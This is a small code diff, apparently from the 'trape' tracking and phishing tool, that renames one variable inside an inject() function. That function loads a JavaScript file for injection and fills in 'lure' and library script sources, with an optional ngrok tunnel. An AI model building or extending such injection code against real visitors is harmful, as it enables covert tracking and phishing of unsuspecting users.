@@ -129,9 +129,9 @@ def inject():
     if getattr(sys, 'frozen', False):
         mPath = sys._MEIPASS + '/'
 
-    f_codeToInject = open(mPath + "static/js/inject.js","r")
-    codeToInject = f_codeToInject.read().replace('[LIBS_SRC]', trape.JSFiles[1]['src']).replace('[BASE_SRC]', trape.JSFiles[0]['src']).replace('[LURE_SRC]', trape.JSFiles[3]['src'])
-    f_codeToInject.close()
+    f_code_to_inject = open(mPath + "static/js/inject.js","r")
+    codeToInject = f_code_to_inject.read().replace('[LIBS_SRC]', trape.JSFiles[1]['src']).replace('[BASE_SRC]', trape.JSFiles[0]['src']).replace('[LURE_SRC]', trape.JSFiles[3]['src'])
+    f_code_to_inject.close()
 
     server_code = ''
     if trape.nGrokUrl != '':
